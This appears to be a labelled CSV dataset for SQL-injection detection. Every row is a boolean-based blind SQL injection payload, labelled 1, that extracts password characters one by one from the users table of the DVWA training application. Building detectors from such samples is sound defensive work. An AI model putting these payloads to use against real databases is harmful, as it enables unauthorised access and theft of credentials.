input_text,Label
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),16,1))>53",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),17,1))>47",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),17,1))>87",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),17,1))>67",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),17,1))>57",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),17,1))>52",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),17,1))>49",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),17,1))>48",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),18,1))>47",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),18,1))>87",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),18,1))>107",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),18,1))>97",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),18,1))>102",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),18,1))>99",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),19,1))>96",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),19,1))>48",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),19,1))>72",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),19,1))>60",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),19,1))>54",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),19,1))>57",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),19,1))>55",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),19,1))>56",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),20,1))>47",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),20,1))>87",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),20,1))>67",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),20,1))>57",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),20,1))>52",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),20,1))>49",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),20,1))>50",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),20,1))>51",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),21,1))>47",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),21,1))>87",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),21,1))>67",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),21,1))>57",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),21,1))>52",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),21,1))>49",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),21,1))>50",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),22,1))>47",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),22,1))>87",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),22,1))>67",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),22,1))>57",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),22,1))>52",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),22,1))>55",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),23,1))>47",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),23,1))>87",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),23,1))>107",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),23,1))>97",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),23,1))>102",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),23,1))>99",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),23,1))>100",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),24,1))>96",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),24,1))>112",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),24,1))>104",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),24,1))>100",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),24,1))>102",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),24,1))>101",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),25,1))>96",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),25,1))>112",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),25,1))>104",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),25,1))>100",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),25,1))>98",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),25,1))>97",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),26,1))>96",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),26,1))>48",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),26,1))>72",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),26,1))>60",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),26,1))>54",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),26,1))>57",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),26,1))>55",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),26,1))>56",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),27,1))>87",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),27,1))>67",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),27,1))>57",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),27,1))>52",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),27,1))>54",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),27,1))>55",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),27,1))>56",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),28,1))>47",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),28,1))>87",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),28,1))>67",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),28,1))>57",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),28,1))>52",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),28,1))>49",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),28,1))>50",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),29,1))>47",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),29,1))>87",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),29,1))>107",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),29,1))>97",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),29,1))>102",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),29,1))>99",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),29,1))>98",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),30,1))>96",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),30,1))>112",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),30,1))>104",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),30,1))>100",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),30,1))>102",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),30,1))>101",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),31,1))>96",1
"4 AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),31,1))>48",1
